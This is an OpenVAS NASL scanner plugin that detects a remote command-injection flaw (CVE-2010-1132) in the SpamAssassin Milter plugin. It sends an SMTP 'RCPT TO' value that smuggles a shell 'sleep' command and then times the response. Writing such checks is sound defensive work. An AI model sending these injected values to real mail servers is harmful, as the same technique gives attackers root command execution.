###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_spamassassin_milter_38578.nasl 13667 2019-02-14 13:57:04Z cfischer $
#
# SpamAssassin Milter Plugin 'mlfi_envrcpt()' Remote Arbitrary Command Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100528");
  script_version("$Revision: 13667 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 14:57:04 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-03-15 13:03:19 +0100 (Mon, 15 Mar 2010)");
  script_cve_id("CVE-2010-1132");
  script_bugtraq_id(38578);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("SpamAssassin Milter Plugin 'mlfi_envrcpt()' Remote Arbitrary Command Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("SMTP problems");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_mandatory_keys("smtp/banner/available");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38578");
  script_xref(name:"URL", value:"http://savannah.nongnu.org/projects/spamass-milt/");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2010/Mar/140");

  script_tag(name:"summary", value:"SpamAssassin Milter Plugin is prone to a remote command-
  injection vulnerability because it fails to adequately sanitize user-supplied input data.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to execute arbitrary
  shell commands with root privileges.");

  script_tag(name:"affected", value:"SpamAssassin Milter Plugin 0.3.1 is affected. Other versions
  may also be vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");

ports = smtp_get_ports();
foreach port( ports ) {

  if(get_kb_item("smtp/" + port + "/qmail/detected"))
    continue;

  banner = get_smtp_banner(port:port);
  if(!banner)
    continue;

  dom = eregmatch(pattern:"220 ([^ ]+)", string:banner);
  if(isnull(dom[1])) {
    domain = get_host_name();
  } else {
    domain = dom[1];
  }

  soc = smtp_open(port:port, data:NULL);
  if(!soc)
    continue;

  vtstrings = get_vt_strings();
  src_name = this_host_name();
  FROM = string(vtstrings["lowercase"], '@', src_name);
  TO = string(vtstrings["lowercase"], '@', domain);

  send(socket:soc, data:strcat('HELO ', src_name, '\r\n'));
  buf = smtp_recv_line(socket:soc, code:"250");
  if(!buf) {
    smtp_close(socket:soc, check_data:buf);
    continue;
  }

  start1 = unixtime();
  send(socket:soc, data:strcat('MAIL FROM: ', FROM, '\r\n'));
  buf = smtp_recv_line(socket:soc, code:"250");
  if(!buf) {
    smtp_close(socket:soc, check_data:buf);
    continue;
  }

  stop1 = unixtime();
  dur1 = stop1 - start1;

  start2 = unixtime();
  send(socket:soc, data:string('RCPT TO: root+:"; sleep 16 ;"\r\n'));
  buf = smtp_recv_line(socket:soc);
  stop2 = unixtime();
  dur2 = stop2 - start2;

  smtp_close(socket:soc, check_data:buf);

  if(buf && buf =~ "^250[ -]" && (dur2 > dur1 && dur2 > 15 && dur2 < 20)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
